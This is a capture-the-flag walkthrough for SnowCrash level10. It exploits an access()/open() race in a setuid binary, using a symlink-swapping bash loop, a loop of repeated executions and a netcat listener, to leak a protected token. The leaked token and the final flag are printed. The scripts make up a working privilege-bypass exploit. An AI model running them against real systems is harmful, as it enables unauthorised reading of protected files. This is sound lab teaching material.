# level 10

## Hint

There are two files present in our home for user `level10`:

```shell-session
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

We notice the following:
1. An executable called `level10` with suid/guid bits activated and extended permissions
2. A token file we are not allowed to read or write to.

Executing the binary with no argument gives us the following:

```shell-session
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```

And we **CANNOT** run binary on a file we do not have the rights over:
```shell-session
level10@SnowCrash:~$ ./level10 token localhost:6969
You don't have access to token
```

So what may we deduce from this set piece ?

First, we need to find a way to send a file outward. 

Second, how to access `token` file.

## no clue

First, we need to figure out what the binary expects *exactly*:

```shell-session
level10@SnowCrash:~$ echo "yup" > /tmp/test
level10@SnowCrash:~$ ./level10 /tmp/test test
Connecting to test:6969 .. Unable to connect to host test
```

So the second argument must be a destination for the file, since we bridged the VM to our localhost IP on our Host machine we may try the following:

```shell-session
level10@SnowCrash:~$ ./level10 /tmp/test localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```

Okay, maybe it needs a plain IP:

```shell-session
level10@SnowCrash:~$ ./level10 /tmp/test 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```

This is puzzling...

Lets dig deeper into the binary...

### gdb and strace

There are several ways available to us in order to understand what's going on inside the binary:
1. `gdb` will let us see assembly code and will also let us know when and what system calls are made.
2. `strace` will tell us which system calls are made and what parameters they are given.
3. And more... But that will suffice.

lets run `gdb` first.

#### gdb 

```shell-session
level10@SnowCrash:~$ gdb -q level10
Reading symbols from /home/user/level10/level10...done.
(gdb) disas main
Dump of assembler code for function main:
	[...]
   0x08048749 <+117>:	call   0x80485e0 <access@plt>
   0x0804874e <+122>:	test   %eax,%eax
   0x08048750 <+124>:	jne    0x8048940 <main+620>
   0x08048756 <+130>:	mov    $0x8048a7b,%eax
   0x0804875b <+135>:	mov    0x2c(%esp),%edx
   0x0804875f <+139>:	mov    %edx,0x4(%esp)
   0x08048763 <+143>:	mov    %eax,(%esp)
   0x08048766 <+146>:	call   0x8048520 <printf@plt>
   0x0804876b <+151>:	mov    0x804a060,%eax
   0x08048770 <+156>:	mov    %eax,(%esp)
   0x08048773 <+159>:	call   0x8048530 <fflush@plt>
   0x08048778 <+164>:	movl   $0x0,0x8(%esp)
   0x08048780 <+172>:	movl   $0x1,0x4(%esp)
   0x08048788 <+180>:	movl   $0x2,(%esp)
   0x0804878f <+187>:	call   0x80485f0 <socket@plt>
```

We reduced output for clarity's sake, but the main information here is:
1. the `socket` system call is used to establish connection to `host`
2. the `access` system call is used to check rights before opening file

#### strace

Now to launch `strace` and assert precisely what are the parameters given to the system calls we identified with `gdb`.

```shell-session
level10@SnowCrash:~$ strace ./level10 /tmp/test 127.0.0.1
execve("./level10", ["./level10", "/tmp/test", "127.0.0.1"], [/* 18 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
[...]
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
[...]
access("/tmp/test", R_OK)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "Connecting to 127.0.0.1:6969 .. ", 32Connecting to 127.0.0.1:6969 .. ) = 32
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
```

We see the calls to `access` and `socket`, lets focus on `socket`:

```shell-session
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
```

We see arguments:
- `PF_INET`: which is a contants that determines networking details that are of no use to us right now:
> AF_INET = Address Format, Internet = IP Addresses
> PF_INET = Packet Format, Internet = IP, TCP/IP or UDP/IP
> Meaning, AF_INET refers to addresses from the internet, IP addresses specifically.
> PF_INET refers to anything in the protocol, usually sockets/ports.
- Same for `IPPROTO_IP`:
> The protocol specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
> [...]
> This constant has the value 0. It's actually an automatic choice depending on socket type and family.
- `SOCK_STREAM` though does help us further understanding the binary.


### reading manuals I

`socket` takes a `SOCK_STREAM` and the [man](https://man7.org/linux/man-pages/man2/socket.2.html) for this type of port to port communication reads:

>       SOCK_STREAM
>             Provides sequenced, reliable, two-way, connection-based
>             byte streams.  An out-of-band data transmission mechanism
>             may be supported.

The key word here is `two-way`, this must mean that `if there is nobody listening the port the binary is trying to send the file to, then the system call fails.`

**Progress.**

## netcat

After some research there seems to be a tool we should use in order to listen to port `6969` and make this file transfer possible: [netcat](https://linuxize.com/post/netcat-nc-command-with-examples/).

> Netcat (or nc) is a command-line utility that reads and writes data across network connections, using the TCP or UDP protocols. It is one of the most powerful tools in the network and system administrators arsenal, and it as considered as a Swiss army knife of networking tools.
>
>Netcat is cross-platform, and it is available for Linux, macOS, Windows, and BSD. You can use Netcat to debug and monitor network connections, scan for open ports, transfer data, as a proxy, and more.

Also, the man tell us:
> It is quite simple to build a very basic client/server model using nc. On one console, start nc listening on a specific port for a connection. For example:
>
> $ nc -l 1234
>
> nc is now listening on port 1234 for a connection. On a second console (or a second machine), connect to the machine and port being listened on:
>
> $ nc 127.0.0.1 1234
> There should now be a connection between the ports. Anything typed at the second console will be concatenated to the first, and vice-versa. After the connection has been set up, nc does not really care which side is being used as a 'server' and which side is being used as a 'client'. The connection may be terminated using an EOF ('^D'). 


## sending the file outward

And indeed, when we launch the `nc` tool with the right `-l` option in one terminal, and redo the sequence of commands we did for our first test in another terminal we get:

Terminal 1:

```shell-session
level10@SnowCrash:~$ nc -l 6969
$_[pending]
```

Terminal 2:

```shell-session
level10@SnowCrash:~$ echo "yup" > /tmp/test
level10@SnowCrash:~$ ./level10 /tmp/test 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

Terminal 1:

```shell-session
level10@SnowCrash:~$ nc -l 6969
.*( )*.
yup
```

**Success !**

## Accessing the file

So, as said previously, the `level10` binary uses `access` to check rights of effective user before opening file.

Lets learn a bit more about this system call, and look for possible exploits.

### reading manuals II

Indeed, the man for [access](https://man7.org/linux/man-pages/man2/access.2.html) eventually tells us:

>NOTES
>      Warning: Using these calls to check if a user is authorized to,
>      for example, open a file before actually doing so using open(2)
>      creates a security hole, because the user might exploit the short
>      time interval between checking and opening the file to manipulate
>      it.  For this reason, the use of this system call should be
>      avoided.  (In the example just described, a safer alternative
>      would be to temporarily switch the process's effective user ID to
>      the real ID and then call open(2).)
>
> access() always dereferences symbolic links.  If you need to
>      check the permissions on a symbolic link, use faccessat() with
>      the flag AT_SYMLINK_NOFOLLOW.

So there is a security hole to exploit in that binary in order to send out a file we do **not** own.

To put it clearly, if we:
- give to the binary a symlink to a file we own so that `access` checks our access rights and returns "OK"
- then change the destination to that link to a file we **DO NOT** own **BEFORE** `open` is called

We will be able to see the contents of a file we don't own.

### exploit

As we did in `level08`, we could try to trick the binary with symlinks.

Meaning, pointing successively at a file we **do** own for the call to `access` to succeed, and then point to one we **do not** own for the call to `open`.

Since we **cannot** reliably manually launch a script at the right moment **between** calls to `access` and `open`, we should try to make a script that does it for us.

*Tasks that the script must do:*
1. Create a `/tmp/outward` link, and a dummy path string to point to.
2. Alternate between linking the dummy path and the targeted protected `token` file we are trying to send out.
3. Repeatedly call the binary with the link and wait for the contents of `token` to leak on another terminal with `netcat` running

Terminal 1:

1. Make the script to loop linking

```shell-session
#!/bin/bash

set -eu

while true
do
  ln -sf /tmp/dummy /tmp/outward
  ln -sf /home/user/level10/token /tmp/outward
done
echo "DONE."
```

2. Send it to the VM in `/tmp`

```shell-session
 λ snowcrash42/level10/Ressources scp -P 4242 loop_linking scp://level10@192.168.1.27//tmp/loop_linking
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.1.27 2a01:cb08:18b:8b00:3560:55b:1aa8:44ee 2a01:cb08:18b:8b00:a00:27ff:fef7:2e52
level10@192.168.1.27's password:
loop_linking                                                 100%  132   321.0KB/s   00:00
```

3. Make the script to loop execution
```shell-session
#!/bin/bash

set -xeu

for i in {1..100};
do
  ( ~/./level10 /tmp/outward $1 & )
done
```

4. Send it to the VM in `/tmp`

```shell-session
 λ snowcrash42/level10/Ressources scp -P 4242 loop_execution scp://level10@192.168.1.27//tmp/loop_execution
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.1.27 2a01:cb08:18b:8b00:3560:55b:1aa8:44ee 2a01:cb08:18b:8b00:a00:27ff:fef7:2e52
level10@192.168.1.27's password:
loop_execution                                               100%  108   340.1KB/s   00:00
```

Terminal 2:

5. In the VM, give rights to all files

```shell-session
level10@SnowCrash:/tmp$ touch dummy
level10@SnowCrash:/tmp$ chmod 777 dummy loop_execution loop_linking
```

6. Run in the background the loop_linking

```shell-sesion
level10@SnowCrash:/tmp$ ./loop_linking &
[1] 2522
level10@SnowCrash:/tmp$ jobs
[1]+  Running                 ./loop_linking &
```

Terminal 3:

7. Launch `netcat` to continuously listen to port `6969 `

```shell-session
level10@SnowCrash:~$ nc -lk 6969
$_[pending]
```

8. Launch loop_execution

Terminal 2:

```shell-session
level10@SnowCrash:/tmp$ ./loop_execution "127.0.0.1"
+ for i in '{1..100}'
+ for i in '{1..100}'
+ for i in '{1..100}'
+ /home/user/level10/./level10 /tmp/outward 127.0.0.1
You don't have access to /tmp/outward
[...]
Sending file .. wrote file!
+ /home/user/level10/./level10 /tmp/outward 127.0.0.1
Connecting to 127.0.0.1:6969 .. + for i in '{1..100}'
Connected!
^C
[...]

```

Terminal 3 :

9. See the contents of `token` file. 
```shell-session
level10@SnowCrash:~$ nc -lk 6969
woupa2yuojeeaaed06riuj63c
.*( )*.
```

## getflag

```shell-session
 λ snowcrash42/level10/Ressources ssh flag10@192.168.1.28 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.1.28 2a01:cb08:18b:8b00:24ec:7e63:a9c2:6b92 2a01:cb08:18b:8b00:a00:27ff:fe7d:ef51
flag10@192.168.1.28's password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$
```
